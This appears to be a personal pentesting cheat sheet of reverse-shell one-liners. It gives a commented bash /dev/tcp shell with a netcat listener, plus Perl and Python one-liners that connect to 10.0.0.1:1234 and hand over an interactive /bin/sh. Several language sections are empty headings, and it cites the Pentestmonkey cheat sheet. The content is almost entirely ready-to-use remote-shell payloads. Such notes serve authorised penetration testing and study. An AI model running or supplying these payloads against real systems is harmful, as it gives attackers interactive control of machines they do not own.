# shells


## Reverse Shells

### Bash
- Tested using
  - Active machine: `Kali Linux 5.7.0`
  - Passive machine: `bash 5.1.4(1)-release` (Kali Linux vagrant box)
- Be sure that `bash` is in use, not `zsh`!

```
# set up netcat listener on active machine
nc -l -vvv -p (nc listener port)

# create reverse shell
# - bash -i :: start interactive bash shell
# - >&      :: redirect both stdout and stderr (fd 1 and 2)
# - /dev/tcp/ip/port :: bash specific syntax for TCP socket connection to ip:port
# - 0<&1    :: redirect fd 1 (connected to the socket) to stdin

bash -i >& /dev/tcp/(active machine)/(nc listener port) 0<&1
```

### Perl (untested)

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python (untested)

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP (untested)

### Ruby (untested)

### Netcat 

### Java

### xterm

## References
- [Pentestmonkey Reverse Shell Cheatsheet](http://web.archive.org/web/20180702062128/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse shell with bash](http://web.archive.org/web/20180625050916/http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
